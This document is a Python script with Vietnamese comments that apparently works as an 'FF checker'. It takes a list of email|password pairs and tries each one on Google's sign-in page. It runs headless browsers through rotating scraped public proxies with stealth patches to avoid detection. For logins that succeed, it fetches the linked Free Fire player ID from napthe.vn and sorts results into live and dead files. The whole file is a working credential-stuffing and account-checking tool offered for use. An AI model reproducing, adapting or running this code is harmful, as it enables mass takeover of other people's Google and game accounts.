import threading, queue, time, random, os, psutil, requests
from playwright.sync_api import sync_playwright
from playwright_stealth import stealth_sync
from colorama import Fore, init

init(autoreset=True)

# --- Cấu hình hệ thống ---
ACC_FILE = "acc.txt"
LIVE_FILE = "live.txt"
DIE_FILE = "die.txt"
THREADS = 5      # Số luồng chạy trình duyệt (Tùy RAM máy)
MAX_RETRY = 5    # Thử lại 5 lần với proxy khác nhau
TIMEOUT = 35000  # 35 giây

acc_queue = queue.Queue()
valid_proxies = []
lock = threading.Lock()
live, die, checked = 0, 0, 0
start_time = time.time()

# ================= HỆ THỐNG PROXY =================

def scrape_proxies():
    global valid_proxies
    sources = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
        "https://www.proxy-list.download/api/v1/get?type=https"
    ]
    new_proxies = []
    for url in sources:
        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                new_proxies.extend(r.text.strip().split("\n"))
        except: continue
    
    with lock:
        valid_proxies = list(set([p.strip() for p in new_proxies if ":" in p]))

def get_proxy():
    with lock:
        if len(valid_proxies) < THREADS:
            scrape_proxies()
        return random.choice(valid_proxies)

def remove_bad_proxy(proxy):
    with lock:
        if proxy in valid_proxies:
            valid_proxies.remove(proxy)

# ================= QUẢN LÝ FILE ACC.TXT =================

def update_acc_file():
    """Xóa mail đã check bằng cách ghi đè các mail còn lại trong queue"""
    with lock:
        remaining = list(acc_queue.queue)
        with open(ACC_FILE, "w") as f:
            for item in remaining:
                f.write(item + "\n")

# ================= LOGIC ĐĂNG NHẬP & LẤY ID =================

def get_ff_id(page):
    try:
        page.goto("https://napthe.vn/app/100067/buy/0", timeout=20000)
        page.click('div[class*="login-channel-google"]', timeout=10000)
        # Chờ trang web load ID người chơi
        page.wait_for_selector(".user-info__id", timeout=15000)
        u_id = page.inner_text(".user-info__id").replace("ID:", "").strip()
        return u_id if u_id.isdigit() else None
    except:
        return None

def check_worker():
    global live, die, checked
    while not acc_queue.empty():
        try:
            acc = acc_queue.get_nowait()
        except: break
        
        email, password = acc.split("|")
        ff_id_found = None
        
        # Bắt đầu vòng lặp Retry 5 lần
        for attempt in range(1, MAX_RETRY + 1):
            proxy = get_proxy()
            
            with sync_playwright() as p:
                try:
                    browser = p.chromium.launch(headless=True, proxy={"server": f"http://{proxy}"})
                    context = browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0")
                    page = context.new_page()
                    stealth_sync(page)

                    # BƯỚC 1: Log Google
                    page.goto("https://accounts.google.com/signin", timeout=TIMEOUT)
                    page.fill('input[type="email"]', email)
                    page.click('#identifierNext')
                    page.wait_for_timeout(2000)
                    
                    # Kiểm tra mail tồn tại/bị chặn
                    if page.query_selector("text=Couldn't find your Google Account") or \
                       page.query_selector("text=secure"):
                        break # Mail die hoặc bị Google ban trình duyệt, không cần retry

                    page.fill('input[name="password"]', password)
                    page.click('#passwordNext')
                    page.wait_for_load_state("networkidle", timeout=20000)

                    # BƯỚC 2: Kiểm tra login thành công và lấy ID
                    if "myaccount.google.com" in page.url or "security" in page.url:
                        ff_id_found = get_ff_id(page)
                        break # Đã thành công, thoát vòng lặp retry
                    
                    elif "challenge" in page.url:
                        break # Dính xác minh danh tính, bỏ qua mail này

                except Exception:
                    remove_bad_proxy(proxy) # Proxy lỗi, tự động xóa và vòng lặp sẽ chạy tiếp lần sau
                finally:
                    browser.close()
            
            if ff_id_found: break

        # Sau khi kết thúc 5 lần thử hoặc đã thành công
        with lock:
            checked += 1
            if ff_id_found:
                live += 1
                print(Fore.GREEN + f"║ LIVE    │ {email:<18} │ ID: {ff_id_found:<10} ║")
                with open(LIVE_FILE, "a") as f: f.write(f"{acc}|{ff_id_found}\n")
            else:
                die += 1
                print(Fore.RED + f"║ DIE     │ {email:<18} │ KHÔNG CÓ ID    ║")
                with open(DIE_FILE, "a") as f: f.write(f"{acc}\n")
            
            # Cập nhật file acc.txt ngay lập tức (xóa mail vừa check)
            update_acc_file()
            
        acc_queue.task_done()

# ================= GIAO DIỆN VÀ KHỞI CHẠY =================

def banner():
    os.system("cls" if os.name == "nt" else "clear")
    cpu, ram = psutil.cpu_percent(), psutil.virtual_memory().percent
    print(Fore.CYAN + "╔══════════════════════════════════════════════════════╗")
    print(Fore.CYAN + "║            FF CHECKER SYSTEM - FULL AUTO             ║")
    print(Fore.CYAN + f"╠══════════════════════════════════════════════════════╣")
    print(Fore.CYAN + f"║ Threads: {THREADS:<5} | Proxy: {len(valid_proxies):<5} | CPU: {cpu}% | RAM: {ram}% ║")
    print(Fore.CYAN + "╚══════════════════════════════════════════════════════╝")
    print(Fore.YELLOW + "╔═════════╪════════════════════╪══════════════════════╗")
    print(Fore.YELLOW + "║ STATUS  │ EMAIL              │ ID FREE FIRE         ║")
    print(Fore.YELLOW + "╠═════════╪════════════════════╪══════════════════════╣")

def main():
    if not os.path.exists(ACC_FILE):
        open(ACC_FILE, "w").close()
        print("Vui lòng thêm acc vào acc.txt!")
        return

    with open(ACC_FILE, "r") as f:
        for line in f:
            if "|" in line: acc_queue.put(line.strip())

    scrape_proxies()
    banner()

    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=check_worker)
        t.start()
        threads.append(t)
    
    for t in threads: t.join()
    
    print(Fore.YELLOW + "╚═════════╧════════════════════╧══════════════════════╝")
    print(f"\n[HOÀN THÀNH] LIVE: {live} | DIE: {die}")

if __name__ == "__main__":
    main()
